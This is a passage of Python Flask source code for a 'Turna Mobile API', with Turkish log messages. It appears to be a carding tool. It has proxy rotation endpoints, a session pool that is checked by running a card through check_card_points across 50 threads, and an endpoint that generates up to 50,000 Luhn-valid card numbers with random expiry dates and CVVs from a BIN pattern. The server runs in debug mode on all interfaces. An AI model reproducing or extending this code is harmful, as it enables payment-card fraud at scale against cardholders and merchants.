@app.route('/api/proxy/reset', methods=['POST'])
def proxy_reset_api():
    try:
        reset_proxies()
        logger.info("Proxy'ler sıfırlandı")
        return jsonify({'success': True, 'message': 'Proxy\'ler başarıyla sıfırlandı'})
    except Exception as e:
        logger.error(f"Proxy sıfırlama hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/stats', methods=['GET'])
def proxy_stats_api():
    try:
        stats = get_proxy_stats()
        return jsonify({'success': True, 'stats': stats})
    except Exception as e:
        logger.error(f"Proxy istatistik hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['POST'])
def set_proxy_api():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'Geçersiz JSON verisi'}), 400
            
        proxy_string = data.get('proxy_url', '').strip()
        
        if not proxy_string:
            return jsonify({'success': False, 'error': 'Proxy bilgisi boş olamaz'}), 400
        
        success, message = set_proxy(proxy_string)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Proxy ayarlama hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['DELETE'])
def clear_proxy_api():
    try:
        success, message = clear_proxy()
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Proxy temizleme hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/test', methods=['POST'])
def test_proxy_api():
    try:
        success, result = test_proxy()
        if success:
            return jsonify({'success': True, **result})
        else:
            return jsonify({'success': False, 'error': result})
    except Exception as e:
        logger.error(f"Proxy test hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/test', methods=['POST'])
def test_sessions_api():
    try:
        sessions_db = load_sessions_database()
        sessions = sessions_db['sessions']
        
        if not sessions:
            return jsonify({'success': False, 'error': 'Test edilecek session yok'}), 400
        
        active_sessions = [s for s in sessions if s.get('is_active', True)]
        logger.info(f"{len(active_sessions)} sessions testing...")
        
        test_card = {
            'card_number': '5500000000000004',
            'month': '12',
            'year': '2030',
            'cvv': '123'
        }
        
        def test_single_session(sess):
            try:
                result = check_card_points(test_card, sess)
                
                if result['success']:
                    sess['is_active'] = True
                    logger.info(f"Session {sess['id']}: Active")
                    return sess, True
                else:
                    sess['is_active'] = False
                    logger.warning(f"Session {sess['id']}: Inactive - {result.get('error', 'Error')}")
                    return sess, False
                    
            except Exception as e:
                sess['is_active'] = False
                logger.error(f"Session {sess['id']}: Error - {str(e)}")
                return sess, False
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(test_single_session, sess) for sess in active_sessions]
            
            tested_sessions = []
            for future in as_completed(futures):
                sess, is_active = future.result()
                tested_sessions.append(sess)
        
        original_count = len(sessions)
        sessions = [sess for sess in sessions if sess['is_active']]
        deleted_count = original_count - len(sessions)
        
        sessions_db['sessions'] = sessions
        save_sessions_database(sessions_db)
        
        active_count = len(sessions)
        
        logger.info(f"Session test done: {active_count} active, {deleted_count} deleted")
        
        return jsonify({
            'success': True, 
            'message': f'{active_count} active, {deleted_count} deleted',
            'sessions': sessions,
            'active_count': active_count,
            'deleted_count': deleted_count
        })
        
    except Exception as e:
        logger.error(f"Session test error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

def luhn_checksum(card_number):
    """Luhn algorithm to validate card number"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    """Check if card number is valid using Luhn algorithm"""
    return luhn_checksum(card_number) == 0

def calculate_luhn(partial_card_number):
    """Calculate check digit for partial card number"""
    check_digit = luhn_checksum(int(partial_card_number) * 10)
    return str((10 - check_digit) % 10)

def generate_card_number(bin_pattern):
    """Generate valid card number from BIN pattern"""
    card_length = 16
    
    for attempt in range(500):
        card_number = ''
        for char in bin_pattern.lower():
            if char == 'x':
                card_number += str(random.randint(0, 9))
            elif char.isdigit():
                card_number += char
        
        while len(card_number) < card_length:
            card_number += str(random.randint(0, 9))
        
        card_number = card_number[:card_length]
        
        partial = card_number[:-1]
        check_digit = calculate_luhn(partial)
        card_number = partial + check_digit
        
        if is_luhn_valid(card_number):
            return card_number
    
    card_number = bin_pattern.lower().replace('x', str(random.randint(0, 9)))
    while len(card_number) < card_length:
        card_number += str(random.randint(0, 9))
    card_number = card_number[:card_length]
    partial = card_number[:-1]
    check_digit = calculate_luhn(partial)
    return partial + check_digit

@app.route('/api/generate-cards', methods=['POST'])
def generate_cards_api():
    try:
        data = request.get_json()
        bin_pattern = data.get('bin', '').strip()
        quantity = int(data.get('quantity', 10))
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        if not bin_pattern or len(bin_pattern) < 6:
            return jsonify({'success': False, 'error': 'BIN en az 6 hane olmali'}), 400
        
        if quantity < 1 or quantity > 50000:
            return jsonify({'success': False, 'error': 'Miktar 1-50000 arasi olmali'}), 400
        
        cards = []
        current_year = datetime.now().year
        
        for i in range(quantity):
            card_number = generate_card_number(bin_pattern)
            
            if month:
                card_month = month
            else:
                card_month = f"{random.randint(1, 12):02d}"
            
            if year:
                card_year = year
            else:
                card_year = str(random.randint(current_year, current_year + 8))
            
            if cvv:
                card_cvv = cvv
                while len(card_cvv) < 3:
                    card_cvv += str(random.randint(0, 9))
                card_cvv = card_cvv[:4]
            else:
                card_cvv = f"{random.randint(0, 999):03d}"
            
            cards.append(f"{card_number}|{card_month}|{card_year}|{card_cvv}")
        
        logger.info(f"Generated {len(cards)} cards with BIN: {bin_pattern}")
        
        return jsonify({
            'success': True,
            'cards': cards,
            'count': len(cards)
        })
        
    except Exception as e:
        logger.error(f"Card generation error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    saved_config = load_proxy_config()
    if saved_config:
        PROXY_STATUS['is_set'] = saved_config.get('is_set', False)
        PROXY_STATUS['proxy_url'] = saved_config.get('proxy_url')
        PROXY_STATUS['rotation_enabled'] = saved_config.get('rotation_enabled', True)
        if PROXY_STATUS['is_set'] and PROXY_STATUS['proxy_url']:
            logger.info(f"Loaded saved proxy: {PROXY_STATUS['proxy_url'].split('@')[1] if '@' in PROXY_STATUS['proxy_url'] else 'N/A'}")
    
    print(f"\n{'='*60}")
    print(f"  Turna Mobile API v{__version__} by {__author__}")
    print(f"{'='*60}\n")
    logger.info(f"Starting server by {__author__}...")
    logger.info("http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
